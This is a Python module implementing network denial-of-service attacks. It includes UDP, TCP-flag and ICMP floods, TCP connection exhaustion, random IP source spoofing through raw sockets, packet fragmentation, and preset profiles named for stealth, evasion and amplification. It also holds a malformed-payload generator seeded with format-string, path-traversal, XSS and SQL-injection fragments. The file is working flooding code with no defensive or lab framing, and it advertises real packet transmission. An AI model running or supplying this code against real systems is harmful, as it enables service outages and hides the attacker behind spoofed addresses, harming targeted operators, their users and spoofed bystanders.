"""
Layer 4 Attack Vectors Module

Implements comprehensive Layer 4 (Transport Layer) attack vectors:
- UDP Flood with configurable payloads and IP spoofing
- TCP Flag attacks (SYN, ACK, RST, FIN floods)
- ICMP Flood with configurable types and fragmentation
- Advanced packet crafting with raw sockets
- IP spoofing support for enhanced evasion
"""

import asyncio
import socket
import struct
import random
import time
import os
import platform
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple, Union
import logging

# Try to import scapy for advanced packet crafting
try:
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.sendrecv import send, sendp
    from scapy.volatile import RandShort
    from scapy.packet import Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger(__name__)


@dataclass
class Layer4Config:
    """Configuration for Layer 4 attacks"""
    target: str
    port: int
    duration: int = 60
    rate_limit: int = 10000  # Packets per second
    threads: int = 4
    payload_size: int = 1024
    payload_pattern: str = 'random'  # 'random', 'zeros', 'ones', 'sequence', 'custom'
    custom_payload: Optional[bytes] = None
    spoof_source: bool = False
    source_ip_range: Optional[Tuple[str, str]] = None  # ('192.168.1.1', '192.168.1.254')
    source_port_range: Tuple[int, int] = (1024, 65535)
    fragment_packets: bool = False
    fragment_size: int = 8  # Fragment size for ICMP


@dataclass
class Layer4Stats:
    """Statistics for Layer 4 attacks"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    fragments_sent: int = 0
    start_time: float = field(default_factory=time.time)
    
    def get_pps(self) -> float:
        elapsed = time.time() - self.start_time
        return self.packets_sent / elapsed if elapsed > 0 else 0
    
    def get_mbps(self) -> float:
        elapsed = time.time() - self.start_time
        return (self.bytes_sent * 8) / (elapsed * 1024 * 1024) if elapsed > 0 else 0


class PayloadGenerator:
    """Generates various types of payloads for Layer 4 attacks"""
    
    @staticmethod
    def generate_payload(size: int, pattern: str = 'random', custom: Optional[bytes] = None) -> bytes:
        """
        Generate payload data based on pattern.
        
        Args:
            size: Payload size in bytes
            pattern: Pattern type ('random', 'zeros', 'ones', 'sequence', 'custom')
            custom: Custom payload bytes (used when pattern='custom')
            
        Returns:
            Generated payload bytes
        """
        if size <= 0:
            return b''
            
        if pattern == 'random':
            return bytes(random.getrandbits(8) for _ in range(size))
        elif pattern == 'zeros':
            return b'\x00' * size
        elif pattern == 'ones':
            return b'\xff' * size
        elif pattern == 'sequence':
            return bytes(i % 256 for i in range(size))
        elif pattern == 'custom' and custom:
            # Repeat custom payload to reach desired size
            if len(custom) >= size:
                return custom[:size]
            else:
                repeats = (size // len(custom)) + 1
                return (custom * repeats)[:size]
        else:
            # Default to random
            return bytes(random.getrandbits(8) for _ in range(size))
    
    @staticmethod
    def generate_malformed_payload(size: int) -> bytes:
        """Generate malformed payload for fuzzing"""
        payload = bytearray(size)
        
        # Insert various malformed patterns
        patterns = [
            b'\x00' * 100,  # Null bytes
            b'\xff' * 50,   # Max bytes
            b'\x41' * 200,  # 'A' pattern
            b'\x90' * 100,  # NOP sled
            b'%n%n%n%n',    # Format string
            b'../../../',   # Path traversal
            b'<script>',    # XSS attempt
            b'SELECT * FROM',  # SQL injection
        ]
        
        pos = 0
        for pattern in patterns:
            if pos + len(pattern) < size:
                payload[pos:pos+len(pattern)] = pattern
                pos += len(pattern)
            else:
                break
                
        # Fill remaining with random
        if pos < size:
            for i in range(pos, size):
                payload[i] = random.getrandbits(8)
                
        return bytes(payload)


class IPSpoofing:
    """Handles IP address spoofing for attacks"""
    
    @staticmethod
    def generate_random_ip() -> str:
        """Generate a random IP address"""
        return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    @staticmethod
    def generate_ip_from_range(start_ip: str, end_ip: str) -> str:
        """Generate IP address within specified range"""
        start_parts = list(map(int, start_ip.split('.')))
        end_parts = list(map(int, end_ip.split('.')))
        
        # Simple implementation - randomize last octet
        if start_parts[:3] == end_parts[:3]:
            last_octet = random.randint(start_parts[3], end_parts[3])
            return f"{start_parts[0]}.{start_parts[1]}.{start_parts[2]}.{last_octet}"
        else:
            # More complex range - just randomize for now
            return IPSpoofing.generate_random_ip()
    
    @staticmethod
    def is_spoofing_available() -> bool:
        """Check if IP spoofing is available (requires raw sockets)"""
        if platform.system() == 'Windows':
            return False  # Windows raw sockets have restrictions
            
        try:
            # Try to create a raw socket
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            test_sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False


class Layer4Attack(ABC):
    """Base class for Layer 4 attacks"""
    
    def __init__(self, config: Layer4Config):
        self.config = config
        self.stats = Layer4Stats()
        self._running = False
        self._use_raw_sockets = SCAPY_AVAILABLE and config.spoof_source and IPSpoofing.is_spoofing_available()
        
    @abstractmethod
    async def _execute_attack(self):
        """Execute the specific attack logic"""
        pass
    
    async def start(self):
        """Start the attack"""
        self._running = True
        self.stats = Layer4Stats()
        
        logger.info(f"Starting {self.__class__.__name__} on {self.config.target}:{self.config.port}")
        logger.info(f"Rate: {self.config.rate_limit} PPS, Duration: {self.config.duration}s")
        logger.info(f"Payload: {self.config.payload_size} bytes ({self.config.payload_pattern})")
        logger.info(f"IP Spoofing: {'Enabled' if self.config.spoof_source else 'Disabled'}")
        logger.info(f"Raw Sockets: {'Available' if self._use_raw_sockets else 'Not Available'}")
        
        try:
            await asyncio.wait_for(
                self._execute_attack(),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
        finally:
            self._running = False
            
        logger.info(f"Attack completed: {self.stats.packets_sent} packets, "
                   f"{self.stats.get_pps():.1f} PPS, {self.stats.get_mbps():.2f} Mbps")
    
    async def stop(self):
        """Stop the attack"""
        self._running = False
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return {
            'packets_sent': self.stats.packets_sent,
            'bytes_sent': self.stats.bytes_sent,
            'pps': self.stats.get_pps(),
            'mbps': self.stats.get_mbps(),
            'errors': self.stats.errors,
            'fragments_sent': self.stats.fragments_sent,
        }


class UDPFlood(Layer4Attack):
    """
    UDP Flood Attack with configurable payload and IP spoofing.
    
    Features:
    - Configurable payload sizes and patterns
    - IP spoofing support (requires raw sockets/root)
    - High-performance multi-threaded implementation
    - Real packet transmission (no simulation)
    """
    
    async def _execute_attack(self):
        """Execute UDP flood attack"""
        tasks = []
        for i in range(self.config.threads):
            if self._use_raw_sockets:
                task = asyncio.create_task(self._udp_worker_raw(i))
            else:
                task = asyncio.create_task(self._udp_worker_socket(i))
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _udp_worker_raw(self, worker_id: int):
        """UDP worker using raw sockets with scapy"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                # Generate source IP
                if self.config.source_ip_range:
                    src_ip = IPSpoofing.generate_ip_from_range(*self.config.source_ip_range)
                else:
                    src_ip = IPSpoofing.generate_random_ip()
                
                # Generate source port
                src_port = random.randint(*self.config.source_port_range)
                
                # Generate payload
                payload = PayloadGenerator.generate_payload(
                    self.config.payload_size,
                    self.config.payload_pattern,
                    self.config.custom_payload
                )
                
                # Build packet
                pkt = IP(src=src_ip, dst=self.config.target) / \
                      UDP(sport=src_port, dport=self.config.port) / \
                      Raw(load=payload)
                
                # Send packet
                send(pkt, verbose=False)
                
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(pkt)
                
            except Exception as e:
                self.stats.errors += 1
                logger.debug(f"UDP raw worker {worker_id} error: {e}")
                
            await asyncio.sleep(interval)
    
    async def _udp_worker_socket(self, worker_id: int):
        """UDP worker using standard sockets"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Apply socket optimizations
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)  # 1MB send buffer
            sock.setblocking(False)
        except Exception as e:
            logger.debug(f"Socket optimization failed: {e}")
        
        try:
            while self._running:
                try:
                    # Generate payload
                    payload = PayloadGenerator.generate_payload(
                        self.config.payload_size,
                        self.config.payload_pattern,
                        self.config.custom_payload
                    )
                    
                    # Send packet
                    bytes_sent = sock.sendto(payload, (self.config.target, self.config.port))
                    
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += bytes_sent
                    
                except socket.error as e:
                    if e.errno in (11, 10055):  # EAGAIN/EWOULDBLOCK or WSAENOBUFS
                        # Socket buffer full, continue
                        pass
                    else:
                        self.stats.errors += 1
                        logger.debug(f"UDP socket worker {worker_id} error: {e}")
                        
                except Exception as e:
                    self.stats.errors += 1
                    logger.debug(f"UDP socket worker {worker_id} error: {e}")
                    
                await asyncio.sleep(interval)
                
        finally:
            sock.close()


class TCPFlagAttack(Layer4Attack):
    """
    TCP Flag-based attacks (SYN, ACK, RST, FIN floods).
    
    Features:
    - Configurable TCP flags
    - Random sequence numbers
    - IP spoofing support
    - Raw socket implementation for maximum control
    """
    
    TCP_FLAGS = {
        'FIN': 0x01,
        'SYN': 0x02,
        'RST': 0x04,
        'PSH': 0x08,
        'ACK': 0x10,
        'URG': 0x20,
        'ECE': 0x40,
        'CWR': 0x80,
    }
    
    def __init__(self, config: Layer4Config, flags: Union[str, int, List[str]]):
        """
        Initialize TCP flag attack.
        
        Args:
            config: Attack configuration
            flags: TCP flags to set ('SYN', 'ACK', 'RST', 'FIN' or combination)
        """
        super().__init__(config)
        self.tcp_flags = self._parse_flags(flags)
        
    def _parse_flags(self, flags: Union[str, int, List[str]]) -> int:
        """Parse TCP flags into integer value"""
        if isinstance(flags, int):
            return flags
        elif isinstance(flags, str):
            return self.TCP_FLAGS.get(flags.upper(), 0)
        elif isinstance(flags, list):
            flag_value = 0
            for flag in flags:
                flag_value |= self.TCP_FLAGS.get(flag.upper(), 0)
            return flag_value
        else:
            return 0
    
    async def _execute_attack(self):
        """Execute TCP flag attack"""
        tasks = []
        for i in range(self.config.threads):
            if self._use_raw_sockets:
                task = asyncio.create_task(self._tcp_worker_raw(i))
            else:
                task = asyncio.create_task(self._tcp_worker_socket(i))
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _tcp_worker_raw(self, worker_id: int):
        """TCP worker using raw sockets with scapy"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                # Generate source IP
                if self.config.source_ip_range:
                    src_ip = IPSpoofing.generate_ip_from_range(*self.config.source_ip_range)
                else:
                    src_ip = IPSpoofing.generate_random_ip()
                
                # Generate source port and sequence number
                src_port = random.randint(*self.config.source_port_range)
                seq_num = random.randint(0, 2**32 - 1)
                ack_num = random.randint(0, 2**32 - 1) if (self.tcp_flags & self.TCP_FLAGS['ACK']) else 0
                
                # Build packet
                pkt = IP(src=src_ip, dst=self.config.target) / \
                      TCP(sport=src_port, dport=self.config.port, 
                          flags=self.tcp_flags, seq=seq_num, ack=ack_num)
                
                # Add payload if specified
                if self.config.payload_size > 0:
                    payload = PayloadGenerator.generate_payload(
                        self.config.payload_size,
                        self.config.payload_pattern,
                        self.config.custom_payload
                    )
                    pkt = pkt / Raw(load=payload)
                
                # Send packet
                send(pkt, verbose=False)
                
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(pkt)
                
            except Exception as e:
                self.stats.errors += 1
                logger.debug(f"TCP raw worker {worker_id} error: {e}")
                
            await asyncio.sleep(interval)
    
    async def _tcp_worker_socket(self, worker_id: int):
        """TCP worker using standard sockets (limited functionality)"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                try:
                    # Non-blocking connect (sends SYN)
                    result = sock.connect_ex((self.config.target, self.config.port))
                    self.stats.packets_sent += 1
                    
                    # For RST/FIN, immediately close
                    if self.tcp_flags & (self.TCP_FLAGS['RST'] | self.TCP_FLAGS['FIN']):
                        sock.close()
                    else:
                        # Let it timeout naturally
                        await asyncio.sleep(0.1)
                        sock.close()
                        
                except Exception:
                    sock.close()
                    
            except Exception as e:
                self.stats.errors += 1
                logger.debug(f"TCP socket worker {worker_id} error: {e}")
                
            await asyncio.sleep(interval)


class ICMPFlood(Layer4Attack):
    """
    ICMP Flood Attack with configurable types and fragmentation.
    
    Features:
    - Configurable ICMP types (Echo Request, Timestamp, etc.)
    - Packet fragmentation support
    - IP spoofing support
    - Large payload support for amplification
    """
    
    ICMP_TYPES = {
        'ECHO_REQUEST': 8,
        'ECHO_REPLY': 0,
        'DEST_UNREACHABLE': 3,
        'SOURCE_QUENCH': 4,
        'REDIRECT': 5,
        'TIME_EXCEEDED': 11,
        'TIMESTAMP_REQUEST': 13,
        'TIMESTAMP_REPLY': 14,
        'INFO_REQUEST': 15,
        'INFO_REPLY': 16,
        'ADDRESS_MASK_REQUEST': 17,
        'ADDRESS_MASK_REPLY': 18,
        'ROUTER_ADVERTISEMENT': 9,
        'ROUTER_SOLICITATION': 10,
    }
    
    # ICMP Destination Unreachable codes
    DEST_UNREACHABLE_CODES = {
        'NET_UNREACHABLE': 0,
        'HOST_UNREACHABLE': 1,
        'PROTOCOL_UNREACHABLE': 2,
        'PORT_UNREACHABLE': 3,
        'FRAGMENTATION_NEEDED': 4,
        'SOURCE_ROUTE_FAILED': 5,
        'NET_UNKNOWN': 6,
        'HOST_UNKNOWN': 7,
        'SOURCE_HOST_ISOLATED': 8,
        'NET_PROHIBITED': 9,
        'HOST_PROHIBITED': 10,
        'NET_UNREACHABLE_TOS': 11,
        'HOST_UNREACHABLE_TOS': 12,
        'COMMUNICATION_PROHIBITED': 13,
        'HOST_PRECEDENCE_VIOLATION': 14,
        'PRECEDENCE_CUTOFF': 15,
    }
    
    def __init__(self, config: Layer4Config, icmp_type: str = 'ECHO_REQUEST', icmp_code: int = 0):
        """
        Initialize ICMP flood attack.
        
        Args:
            config: Attack configuration
            icmp_type: ICMP message type
            icmp_code: ICMP code (for types that use codes like DEST_UNREACHABLE)
        """
        super().__init__(config)
        self.icmp_type = self.ICMP_TYPES.get(icmp_type.upper(), 8)
        self.icmp_code = icmp_code
        
    async def _execute_attack(self):
        """Execute ICMP flood attack"""
        if not SCAPY_AVAILABLE:
            logger.error("ICMP flood requires scapy library")
            return
            
        tasks = []
        for i in range(self.config.threads):
            task = asyncio.create_task(self._icmp_worker(i))
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _icmp_worker(self, worker_id: int):
        """ICMP worker using scapy"""
        interval = 1.0 / (self.config.rate_limit / self.config.threads)
        
        while self._running:
            try:
                # Generate source IP
                if self.config.spoof_source:
                    if self.config.source_ip_range:
                        src_ip = IPSpoofing.generate_ip_from_range(*self.config.source_ip_range)
                    else:
                        src_ip = IPSpoofing.generate_random_ip()
                else:
                    src_ip = None
                
                # Generate payload
                payload = PayloadGenerator.generate_payload(
                    self.config.payload_size,
                    self.config.payload_pattern,
                    self.config.custom_payload
                )
                
                # Build ICMP packet
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                
                if src_ip:
                    pkt = IP(src=src_ip, dst=self.config.target) / \
                          ICMP(type=self.icmp_type, code=self.icmp_code, id=icmp_id, seq=icmp_seq) / \
                          Raw(load=payload)
                else:
                    pkt = IP(dst=self.config.target) / \
                          ICMP(type=self.icmp_type, code=self.icmp_code, id=icmp_id, seq=icmp_seq) / \
                          Raw(load=payload)
                
                # Handle fragmentation
                if self.config.fragment_packets and len(pkt) > self.config.fragment_size:
                    fragments = self._fragment_packet(pkt)
                    for frag in fragments:
                        send(frag, verbose=False)
                        self.stats.fragments_sent += 1
                else:
                    send(pkt, verbose=False)
                
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(pkt)
                
            except Exception as e:
                self.stats.errors += 1
                logger.debug(f"ICMP worker {worker_id} error: {e}")
                
            await asyncio.sleep(interval)
    
    def _fragment_packet(self, packet) -> List:
        """Fragment a packet into smaller pieces"""
        # Simple fragmentation implementation
        fragments = []
        payload = bytes(packet[Raw].load) if Raw in packet else b''
        
        if len(payload) <= self.config.fragment_size:
            return [packet]
        
        # Create fragments
        offset = 0
        frag_id = random.randint(1, 65535)
        
        while offset < len(payload):
            frag_size = min(self.config.fragment_size, len(payload) - offset)
            frag_payload = payload[offset:offset + frag_size]
            
            # Create fragment
            frag = IP(src=packet[IP].src, dst=packet[IP].dst, id=frag_id) / \
                   ICMP(type=self.icmp_type, code=self.icmp_code, id=random.randint(1, 65535)) / \
                   Raw(load=frag_payload)
            
            # Set fragment flags
            if offset + frag_size < len(payload):
                frag[IP].flags = 1  # More fragments
            frag[IP].frag = offset // 8  # Fragment offset
            
            fragments.append(frag)
            offset += frag_size
        
        return fragments


class TCPConnectionExhaustion(Layer4Attack):
    """
    TCP Connection Exhaustion Attack.
    
    Opens and holds many TCP connections to exhaust server resources.
    Different from flag attacks - actually completes handshake and holds connections.
    """
    
    def __init__(self, config: Layer4Config, hold_time: float = 30.0, max_connections: int = 1000):
        """
        Initialize TCP connection exhaustion attack.
        
        Args:
            config: Attack configuration
            hold_time: How long to hold each connection (seconds)
            max_connections: Maximum concurrent connections per thread
        """
        super().__init__(config)
        self.hold_time = hold_time
        self.max_connections = max_connections
        self._connections: List[socket.socket] = []
        
    async def _execute_attack(self):
        """Execute TCP connection exhaustion attack"""
        tasks = []
        for i in range(self.config.threads):
            task = asyncio.create_task(self._connection_worker(i))
            tasks.append(task)
            
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            # Close all connections
            await self._cleanup_connections()
    
    async def _connection_worker(self, worker_id: int):
        """Worker that opens and holds TCP connections"""
        worker_connections = []
        
        try:
            while self._running:
                # Clean up expired connections
                current_time = time.time()
                expired = []
                for sock, connect_time in worker_connections:
                    if current_time - connect_time > self.hold_time:
                        expired.append((sock, connect_time))
                
                for sock, connect_time in expired:
                    try:
                        sock.close()
                        worker_connections.remove((sock, connect_time))
                    except Exception:
                        pass
                
                # Create new connections if under limit
                if len(worker_connections) < self.max_connections:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5.0)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        
                        # Try to connect
                        result = sock.connect_ex((self.config.target, self.config.port))
                        
                        if result == 0:
                            worker_connections.append((sock, current_time))
                            self.stats.packets_sent += 1
                            logger.debug(f"Worker {worker_id}: Opened connection ({len(worker_connections)} active)")
                        else:
                            sock.close()
                            self.stats.errors += 1
                            
                    except Exception as e:
                        self.stats.errors += 1
                        logger.debug(f"Connection worker {worker_id} error: {e}")
                
                await asyncio.sleep(0.1)  # Small delay between connection attempts
                
        finally:
            # Clean up worker connections
            for sock, _ in worker_connections:
                try:
                    sock.close()
                except Exception:
                    pass
    
    async def _cleanup_connections(self):
        """Clean up all connections"""
        for sock in self._connections:
            try:
                sock.close()
            except Exception:
                pass
        self._connections.clear()


# Factory functions for easy attack creation

def create_udp_flood(target: str, port: int, **kwargs) -> UDPFlood:
    """Create UDP flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return UDPFlood(config)


def create_syn_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create SYN flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, 'SYN')


def create_ack_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create ACK flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, 'ACK')


def create_rst_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create RST flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, 'RST')


def create_fin_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create FIN flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, 'FIN')


def create_icmp_flood(target: str, icmp_type: str = 'ECHO_REQUEST', icmp_code: int = 0, **kwargs) -> ICMPFlood:
    """Create ICMP flood attack"""
    config = Layer4Config(target=target, port=0, **kwargs)  # Port not used for ICMP
    return ICMPFlood(config, icmp_type, icmp_code)


def create_ping_flood(target: str, **kwargs) -> ICMPFlood:
    """Create ICMP ping flood (Echo Request)"""
    config = Layer4Config(target=target, port=0, **kwargs)
    return ICMPFlood(config, 'ECHO_REQUEST', 0)


def create_icmp_unreachable_flood(target: str, unreachable_code: str = 'HOST_UNREACHABLE', **kwargs) -> ICMPFlood:
    """Create ICMP Destination Unreachable flood"""
    config = Layer4Config(target=target, port=0, **kwargs)
    code = ICMPFlood.DEST_UNREACHABLE_CODES.get(unreachable_code.upper(), 1)
    return ICMPFlood(config, 'DEST_UNREACHABLE', code)


def create_icmp_timestamp_flood(target: str, **kwargs) -> ICMPFlood:
    """Create ICMP Timestamp Request flood"""
    config = Layer4Config(target=target, port=0, **kwargs)
    return ICMPFlood(config, 'TIMESTAMP_REQUEST', 0)


def create_icmp_redirect_flood(target: str, **kwargs) -> ICMPFlood:
    """Create ICMP Redirect flood"""
    config = Layer4Config(target=target, port=0, **kwargs)
    return ICMPFlood(config, 'REDIRECT', 0)


def create_xmas_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create XMAS flood attack (FIN+PSH+URG flags)"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, ['FIN', 'PSH', 'URG'])


def create_null_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create NULL flood attack (no flags set)"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, 0)


def create_push_ack_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create PUSH-ACK flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, ['PSH', 'ACK'])


def create_syn_ack_flood(target: str, port: int, **kwargs) -> TCPFlagAttack:
    """Create SYN-ACK flood attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPFlagAttack(config, ['SYN', 'ACK'])


def create_connection_exhaustion(target: str, port: int, hold_time: float = 30.0, 
                               max_connections: int = 1000, **kwargs) -> TCPConnectionExhaustion:
    """Create TCP connection exhaustion attack"""
    config = Layer4Config(target=target, port=port, **kwargs)
    return TCPConnectionExhaustion(config, hold_time, max_connections)


# Attack profiles for common scenarios
LAYER4_ATTACK_PROFILES = {
    'udp_basic': {
        'payload_size': 1024,
        'payload_pattern': 'random',
        'rate_limit': 10000,
        'spoof_source': False,
    },
    'udp_amplification': {
        'payload_size': 8192,
        'payload_pattern': 'random',
        'rate_limit': 5000,
        'spoof_source': True,
    },
    'syn_flood_basic': {
        'payload_size': 0,
        'rate_limit': 20000,
        'spoof_source': False,
    },
    'syn_flood_spoofed': {
        'payload_size': 0,
        'rate_limit': 15000,
        'spoof_source': True,
        'source_ip_range': ('10.0.0.1', '10.0.0.254'),
    },
    'ack_flood_basic': {
        'payload_size': 0,
        'rate_limit': 25000,
        'spoof_source': False,
    },
    'rst_flood_disruption': {
        'payload_size': 0,
        'rate_limit': 30000,
        'spoof_source': True,
        'source_ip_range': ('192.168.0.1', '192.168.0.254'),
    },
    'fin_flood_stealth': {
        'payload_size': 0,
        'rate_limit': 20000,
        'spoof_source': True,
    },
    'xmas_flood_evasion': {
        'payload_size': 0,
        'rate_limit': 15000,
        'spoof_source': True,
    },
    'null_flood_bypass': {
        'payload_size': 0,
        'rate_limit': 18000,
        'spoof_source': True,
    },
    'push_ack_legitimate': {
        'payload_size': 1024,
        'payload_pattern': 'sequence',
        'rate_limit': 12000,
        'spoof_source': False,
    },
    'connection_exhaustion_basic': {
        'payload_size': 0,
        'rate_limit': 100,  # Lower rate for connection-based attack
        'threads': 10,
        'spoof_source': False,
    },
    'icmp_ping_flood': {
        'payload_size': 1500,
        'payload_pattern': 'sequence',
        'rate_limit': 8000,
        'spoof_source': True,
    },
    'icmp_fragmented': {
        'payload_size': 4096,
        'payload_pattern': 'random',
        'rate_limit': 3000,
        'fragment_packets': True,
        'fragment_size': 8,
        'spoof_source': True,
    },
    'icmp_timestamp_flood': {
        'payload_size': 512,
        'payload_pattern': 'sequence',
        'rate_limit': 10000,
        'spoof_source': True,
    },
    'icmp_unreachable_flood': {
        'payload_size': 1024,
        'payload_pattern': 'random',
        'rate_limit': 8000,
        'spoof_source': True,
        'source_ip_range': ('172.16.0.1', '172.16.0.254'),
    },
    'icmp_redirect_attack': {
        'payload_size': 256,
        'payload_pattern': 'zeros',
        'rate_limit': 5000,
        'spoof_source': True,
    },
    'icmp_smurf_amplification': {
        'payload_size': 1500,
        'payload_pattern': 'ones',
        'rate_limit': 2000,
        'spoof_source': True,
        'source_ip_range': ('10.0.0.1', '10.0.0.254'),
    },
}


def get_attack_profile(profile_name: str) -> Dict[str, Any]:
    """Get predefined attack profile configuration"""
    return LAYER4_ATTACK_PROFILES.get(profile_name, {})